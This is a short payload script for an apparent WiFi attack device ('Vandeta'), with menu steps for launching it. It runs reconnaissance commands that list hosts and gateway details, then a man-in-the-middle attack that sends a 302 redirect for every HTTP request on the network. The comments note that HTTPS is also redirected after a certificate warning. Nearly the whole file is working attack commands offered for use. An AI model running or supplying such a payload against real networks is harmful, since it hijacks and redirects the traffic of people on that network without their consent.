# Vandeta MITM payload - reconnaissance first, then the attack.
#
# `info` and `probe` are read-only: they report what the board can see and never
# start an ARP pair or change a rule. Use them when a run does not land: the
# feed says whether the host answered ARP at all, and which network the board
# actually joined (SSID, channel, board IP, gateway IP + MAC).
#
#   WiFi > Wifi Atks > MITM Attack > Payload > recon.mitm
#   Network > pick the AP, Target > All devices (or one host), Start attack

# Network facts: the link the attack is running on and the gateway itself.
info

# Host facts: `all` lists what the pairing scan found, an address resolves one
# host with its own ARP request.
probe all
probe 192.168.1.1

# The actual attack: a 302 for every plain-HTTP request (and HTTPS, after the
# browser's one-time certificate warning).
redirect * http://example.com/
